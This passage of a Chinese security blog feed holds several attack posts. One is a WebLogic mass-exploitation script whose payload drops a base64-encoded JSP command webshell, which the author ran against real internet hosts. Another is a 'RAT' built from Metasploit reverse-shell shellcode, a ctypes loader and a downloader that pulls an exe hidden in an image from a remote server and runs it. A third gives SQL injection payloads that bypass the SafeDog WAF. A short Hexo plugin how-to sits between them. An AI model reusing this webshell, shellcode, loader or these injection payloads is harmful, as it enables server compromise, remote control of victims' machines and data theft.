xw=input(<span class="string">r'文件路径&gt;'</span>)</span><br><span class="line">            <span class="keyword">if</span> os.path.exists(xw):</span><br><span class="line">                print(<span class="string">'[+] 找到对应的文件'</span>)</span><br><span class="line">                <span class="keyword">with</span> open(xw,<span class="string">'r'</span>,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> x:</span><br><span class="line">                    calc+=<span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> calc==<span class="number">100</span>:</span><br><span class="line">                        p=Process(target=self.xc,args=(url_list,))</span><br><span class="line">                        p.start()</span><br><span class="line">                        calc=<span class="number">0</span></span><br><span class="line">                        url_list.clear()</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span> r <span class="keyword">in</span> x.readlines():</span><br><span class="line">                        qc=<span class="string">""</span>.join(r.split(<span class="string">'\n'</span>))</span><br><span class="line">                        url_list.append(qc)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> len(url_list)&gt;<span class="number">0</span>:</span><br><span class="line">                    b = Process(target=self.xc, args=(url_list,))</span><br><span class="line">                    b.start()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">'[-] 找不到对应的文件'</span>)</span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    headers=&#123;<span class="string">'user-agent'</span>:<span class="string">'Apache-HttpClient/4.1.1 (java 1.5)'</span>,<span class="string">'Connection'</span>:<span class="string">'keep-alive'</span>,<span class="string">'content-type'</span>: <span class="string">'text/xml'</span>,<span class="string">'Accept-Encoding'</span>:<span class="string">'gzip, deflate'</span>&#125;</span><br><span class="line">    path=<span class="string">'/_async/AsyncResponseService'</span></span><br><span class="line">    data=<span class="string">"""&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"&gt;   </span></span><br><span class="line"><span class="string">&lt;soapenv:Header&gt; </span></span><br><span class="line"><span class="string">&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;</span></span><br><span class="line"><span class="string">&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;</span></span><br><span class="line"><span class="string">&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;</span></span><br><span class="line"><span class="string">&lt;void class="java.lang.ProcessBuilder"&gt;</span></span><br><span class="line"><span class="string">&lt;array class="java.lang.String" length="3"&gt;</span></span><br><span class="line"><span class="string">&lt;void index="0"&gt;</span></span><br><span class="line"><span class="string">&lt;string&gt;/bin/bash&lt;/string&gt;</span></span><br><span class="line"><span class="string">&lt;/void&gt;</span></span><br><span class="line"><span class="string">&lt;void index="1"&gt;</span></span><br><span class="line"><span class="string">&lt;string&gt;-c&lt;/string&gt;</span></span><br><span class="line"><span class="string">&lt;/void&gt;</span></span><br><span class="line"><span class="string">&lt;void index="2"&gt;</span></span><br><span class="line"><span class="string">&lt;string&gt;echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4= |base64 -d &gt; servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshells.jsp&lt;/string&gt;</span></span><br><span class="line"><span class="string">&lt;/void&gt;</span></span><br><span class="line"><span class="string">&lt;/array&gt;</span></span><br><span class="line"><span class="string">&lt;void method="start"/&gt;&lt;/void&gt;</span></span><br><span class="line"><span class="string">&lt;/work:WorkContext&gt;</span></span><br><span class="line"><span class="string">&lt;/soapenv:Header&gt;</span></span><br><span class="line"><span class="string">&lt;soapenv:Body&gt;</span></span><br><span class="line"><span class="string">&lt;asy:onAsyncDelivery/&gt;</span></span><br><span class="line"><span class="string">&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;"""</span></span><br><span class="line">    obj=Weblogic(headers=headers,data=data,path=path)</span><br><span class="line">    obj.djc(sys.argv[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>测试结果：<br><b>PS:这里的测试url都是zoomeye前400条</b><br><img src="https://s2.ax1x.com/2019/04/26/EntVmD.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/04/26/Entahn.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/04/26/EntutA.md.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/04/26/EntZ0e.md.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/04/26/EnlrIx.png" alt=""></p><p><b>利用失败图</b><br><img src="https://s2.ax1x.com/2019/04/26/EntsnU.md.png" alt=""></p><p>仓库地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/422926799/python/tree/master/CVE-2019-48814%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7</span><br></pre></td></tr></table></figure></p><p>转载请声明:转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>一个比较捞的rat</title>
      <link href="/posts/10e14164.html"/>
      <url>/posts/10e14164.html</url>
      <content type="html"><![CDATA[<h3 id="什么是rat"><a href="#什么是rat" class="headerlink" title="什么是rat"></a>什么是rat</h3><p>可以在受害者机器内安装恶意组件<br>以下来自百度的解释：</p><blockquote><p>rat是特洛伊木马的一个变体，也成为net-hack程序。RAT是一个可以在目标计算机上安装服务器组件的恶意代码。</p></blockquote><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>1.msf生成shellcode<br>2.将shellcode base64编码藏在图片里<br>3.将图片放入远程站点<br>4.py写一个下载远程图片并匹配出base64写入exe<br>5.删除下载的图片</p><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p>msf生成的shellcode<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">buf =  b&quot;&quot;</span><br><span class="line">buf += b&quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41&quot;</span><br><span class="line">buf += b&quot;\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48&quot;</span><br><span class="line">buf += b&quot;\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f&quot;</span><br><span class="line">buf += b&quot;\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c&quot;</span><br><span class="line">buf += b&quot;\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52&quot;</span><br><span class="line">buf += b&quot;\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66&quot;</span><br><span class="line">buf += b&quot;\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80&quot;</span><br><span class="line">buf += b&quot;\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50&quot;</span><br><span class="line">buf += b&quot;\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&quot;</span><br><span class="line">buf += b&quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48&quot;</span><br><span class="line">buf += b&quot;\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75&quot;</span><br><span class="line">buf += b&quot;\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44&quot;</span><br><span class="line">buf += b&quot;\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b&quot;</span><br><span class="line">buf += b&quot;\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41&quot;</span><br><span class="line">buf += b&quot;\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48&quot;</span><br><span class="line">buf += b&quot;\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b&quot;</span><br><span class="line">buf += b&quot;\x12\xe9\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f&quot;</span><br><span class="line">buf += b&quot;\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0&quot;</span><br><span class="line">buf += b&quot;\x01\x00\x00\x49\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0&quot;</span><br><span class="line">buf += b&quot;\xa8\xf1\x84\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba&quot;</span><br><span class="line">buf += b&quot;\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01\x00&quot;</span><br><span class="line">buf += b&quot;\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x41&quot;</span><br><span class="line">buf += b&quot;\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48&quot;</span><br><span class="line">buf += b&quot;\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf&quot;</span><br><span class="line">buf += b&quot;\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2&quot;</span><br><span class="line">buf += b&quot;\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x85\xc0&quot;</span><br><span class="line">buf += b&quot;\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00\x48&quot;</span><br><span class="line">buf += b&quot;\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58&quot;</span><br><span class="line">buf += b&quot;\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8&quot;</span><br><span class="line">buf += b&quot;\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41&quot;</span><br><span class="line">buf += b&quot;\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31&quot;</span><br><span class="line">buf += b&quot;\xc9\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49&quot;</span><br><span class="line">buf += b&quot;\x89\xc7\x4d\x31\xc9\x49\x89\xf0\x48\x89\xda\x48\x89&quot;</span><br><span class="line">buf += b&quot;\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d&quot;</span><br><span class="line">buf += b&quot;\x28\x58\x41\x57\x59\x68\x00\x40\x00\x00\x41\x58\x6a&quot;</span><br><span class="line">buf += b&quot;\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5\x57\x59\x41&quot;</span><br><span class="line">buf += b&quot;\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c\xff&quot;</span><br><span class="line">buf += b&quot;\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4&quot;</span><br><span class="line">buf += b&quot;\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2&quot;</span><br><span class="line">buf += b&quot;\x56\xff\xd5&quot;</span><br></pre></td></tr></table></figure></p><p>使用py来执行shellcode<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> chardet</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">buf =  <span class="string">b"shellcode"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#这两个微软官方说明是可读可写可执行，PAGE_EXECUTE_READWRITE和VIRTUAL_MEM</span></span><br><span class="line">PAGE_EXECUTE_READWRITE = <span class="number">0x00000040</span> <span class="comment">#参数设定</span></span><br><span class="line">VIRTUAL_MEM = ( <span class="number">0x1000</span> | <span class="number">0x2000</span> ) <span class="comment">#参数设定</span></span><br><span class="line">buf_arr = bytearray (buf) <span class="comment">#shellcode变为一个新的字节数组</span></span><br><span class="line">buf_size = len(buf_arr) <span class="comment">#计算shellcode的大小</span></span><br><span class="line">kernel32 = ctypes.cdll.LoadLibrary(<span class="string">"kernel32.dll"</span>) <span class="comment">#调用kernel32.dll</span></span><br><span class="line">kernel32.VirtualAlloc.restype = ctypes.c_uint64 <span class="comment">#返回类型为c_uint64</span></span><br><span class="line">sc_ptr = kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(buf_size), VIRTUAL_MEM, PAGE_EXECUTE_READWRITE) <span class="comment">#设置</span></span><br><span class="line">buf_ptr = (ctypes.c_char * buf_size).from_buffer(buf_arr) <span class="comment">#将shellcode指向指针</span></span><br><span class="line"><span class="comment">#print(sc_ptr)</span></span><br><span class="line"><span class="comment">#print(buf_ptr)</span></span><br><span class="line">kernel32.RtlMoveMemory(ctypes.c_uint64(sc_ptr),buf_ptr,ctypes.c_int(buf_size)) <span class="comment">#调用dll，指向shellcode</span></span><br><span class="line"></span><br><span class="line">handle = kernel32.CreateThread(ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">ctypes.c_uint64(sc_ptr),</span><br><span class="line">ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br><span class="line">kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(<span class="number">-1</span>))</span><br></pre></td></tr></table></figure></p><p>将执行shellcode的py打包成exe，然后打开，对其进行base64编码<br>然后用HxDx64打开指定的图片，然后将<br>base64编码的exe写入到图片里</p><p>我的图片是<br><img src="https://s2.ax1x.com/2019/04/20/EPnxwn.png" alt=""></p><p>加入base64编码后的exe<br><img src="https://s2.ax1x.com/2019/04/20/EPnzoq.png" alt=""></p><p>加入shellcode后图片大小为7mb<br><img src="https://s2.ax1x.com/2019/04/20/EPupF0.png" alt=""></p><p><b>注意</b><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">将其扔到远程站点，这里以phpstudy搭建为例，不要把放图床，图床会把你图片给模糊或减小你内存</span><br><span class="line">shellcode就少了</span><br></pre></td></tr></table></figure></p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>代码如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author:九世</span></span><br><span class="line"><span class="comment">#time:2019/4/20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">demo</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://192.168.3.83/timg.jpg'</span> <span class="comment">#你的图片地址</span></span><br><span class="line">    rqt=requests.get(url=url)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'xxx.jpg'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> r:</span><br><span class="line">        r.write(rqt.content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">zx</span><span class="params">()</span>:</span></span><br><span class="line">    dq=open(<span class="string">'xxx.jpg'</span>,<span class="string">'rb'</span>)</span><br><span class="line">    zg=str(dq.read()).replace(<span class="string">"b'"</span>,<span class="string">''</span>).replace(<span class="string">"'"</span>,<span class="string">''</span>)</span><br><span class="line">    pp=re.findall(<span class="string">'TVq.*'</span>,zg)</span><br><span class="line">    zh=base64.b64decode(pp[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'demo.exe'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> w:</span><br><span class="line">        w.write(zh)</span><br><span class="line">    os.remove(<span class="string">'xxx.jpg'</span>)</span><br><span class="line">    os.system(<span class="string">'demo.exe'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pd</span><span class="params">()</span>:</span></span><br><span class="line">    j=<span class="string">'xxx.jpg'</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(j):</span><br><span class="line">        file=os.path.getsize(j)</span><br><span class="line">        <span class="keyword">if</span> file==<span class="number">7985376</span>:</span><br><span class="line">            zx()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span>  <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    thead=[]</span><br><span class="line">    thead.append(asyncio.ensure_future(demo()))</span><br><span class="line">    <span class="keyword">await</span> asyncio.wait(thead)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    loop=asyncio.get_event_loop()</span><br><span class="line">    loop.run_until_complete(main())</span><br><span class="line">    loop.close()</span><br><span class="line">    pd()</span><br></pre></td></tr></table></figure></p><p>测试结果<br><img src="https://s2.ax1x.com/2019/04/20/EPusmj.md.gif" alt=""></p><p>仓库地址:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/422926799/python/tree/master/%E7%AE%80%E5%8D%95%E7%9A%84RAT</span><br></pre></td></tr></table></figure></p><p><b>转载请声明：转自422926799.github.io</b></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>hexo安装短链接插件</title>
      <link href="/posts/29a80ae2.html"/>
      <url>/posts/29a80ae2.html</url>
      <content type="html"><![CDATA[<h3 id="为何要用这个插件"><a href="#为何要用这个插件" class="headerlink" title="为何要用这个插件"></a>为何要用这个插件</h3><p>hexo默认的链接方式太长，以至于很难看，而且中文的话<br>分享到qq等等的东东又会把你url自动解码，所以这个插件能解决这些问题</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-abbrlink --save</span><br></pre></td></tr></table></figure><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>打开config.yml，修改permalink中类似这样<br>permalink: posts/:abbrlink.html</p><p>我的配置文件<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">permalink_defaults:</span></span><br><span class="line"><span class="attr">abbrlink:</span></span><br><span class="line"><span class="attr">    alg:</span> <span class="string">crc32</span>  <span class="comment"># 算法：crc16(default) and crc32</span></span><br><span class="line"><span class="attr">    rep:</span> <span class="string">hex</span>    <span class="comment"># 进制：dec(default) and hex</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">posts/:abbrlink.html</span></span><br></pre></td></tr></table></figure></p><h3 id="清除缓存"><a href="#清除缓存" class="headerlink" title="清除缓存"></a>清除缓存</h3><p>修改完之后执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo clean #清除缓存</span><br><span class="line">hexo g #重新渲染</span><br></pre></td></tr></table></figure></p><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="https://s2.ax1x.com/2019/04/19/E96OpT.png" alt=""></p><p><b>转载请声明：转自422926799.github.io</b></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>绕过安全狗新版进行SQL注入</title>
      <link href="/posts/aafbd292.html"/>
      <url>/posts/aafbd292.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在圈子见到某师傅过了安全狗然后注入，然后自己手痒<br>也搭了个环境进行测试。期间搭建环境各种坑….<br>不过后面还是有个不错的结果的</p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=31311706&auto=1&height=66"></iframe><p><img src="https://s2.ax1x.com/2019/04/19/EpamNQ.md.png" alt=""></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先我是用phpstudy+安全狗4.0搭建的环境<br>一开始找不到apache名称，按照网上的来整也不行（一堆重复的沙雕）</p><p>解决方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">以管理员权限运行cmd，进入apache/bin目录</span><br><span class="line">httpd -k install -n apache2.4</span><br><span class="line"></span><br><span class="line">以管理员权限运行cmd，进入mysql/bin目录</span><br><span class="line">mysqld -k install -n MySQla</span><br></pre></td></tr></table></figure></p><p>php代码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$username=<span class="string">"root"</span>;</span><br><span class="line">$password=<span class="string">"root"</span>;</span><br><span class="line">$host=<span class="string">"localhost:3306"</span>;</span><br><span class="line">$database=<span class="string">"test"</span>;</span><br><span class="line">$con=mysqli_connect($host,$username,$password,$database);</span><br><span class="line"><span class="keyword">if</span>(!$con)&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">"Connect mysql faild...."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))&#123;</span><br><span class="line">$sql=<span class="string">"select * from demo where id="</span>.$_GET[<span class="string">'id'</span>];</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">$cha=mysqli_query($con,$sql);</span><br><span class="line">$jg=mysqli_fetch_array($cha);</span><br><span class="line">var_dump($jg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>数据库表和字段如下<br><img src="https://s2.ax1x.com/2019/04/19/EpaxK0.png" alt=""></p><p>尝试and 1=1和and 1=2毫无疑问被拦截了<br><img src="https://s2.ax1x.com/2019/04/19/EpamNQ.png" alt=""></p><p>使用 %26%26 True 和 %26%26 False<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%26=&amp;</span><br><span class="line">&amp;=and</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/04/19/EparDK.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/04/19/EpdA2R.png" alt=""></p><p>使用Xor True 和 Xor False 也不拦<br><img src="https://s2.ax1x.com/2019/04/19/Epd8xI.md.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/04/19/EpwFw8.png" alt=""></p><p>order内联注释就可以绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli.php?id=1/**//*!order*//**//*!by*//**//*!1*/</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/04/19/EpwQmV.md.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/04/19/EpwJfJ.png" alt=""></p><p>union select卡住了。。。怎么也绕不过，后面改去整盲注了<br><img src="https://s2.ax1x.com/2019/04/19/EpBDRH.md.png" alt=""></p><p>and length(database())=8被杀，后面看了网上的文章，@@version database/**/() 这样写不会被杀<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli.php?id=1 %26%26 (length(database/**/())=4)</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/04/19/EpBcLt.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli.php?id=1 %26%26 (ascii(@@version)=53)</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/04/19/EpBOoT.png" alt=""></p><p>判断有多少个表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli.php?id=1 %26%26 (1=(select count(/*!table_name*/) from information_schema.tables where table_schema=0x74657374))</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/04/19/EpDkTK.png" alt=""></p><p>猜表，由于这里使用ascii会被拦截，还有table_name也拦截<br><img src="https://s2.ax1x.com/2019/04/19/Eprn4U.md.png" alt=""></p><p>使用hex函数代替ascii函数，使用count(/<em>!table_name</em>/)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli.php?id=1 %26%26 (hex(substr((select concat(/*!table_name*/) from information_schema.tables where table_schema=0x74657374 limit 0,1),1,1)))</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/04/19/Ep6lvQ.md.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli.php?id=1 %26%26 (hex(substr((select concat(/*!table_name*/) from information_schema.tables where table_schema=0x74657374 limit 0,1),1,1))=64)</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/04/19/Ep6N5V.png" 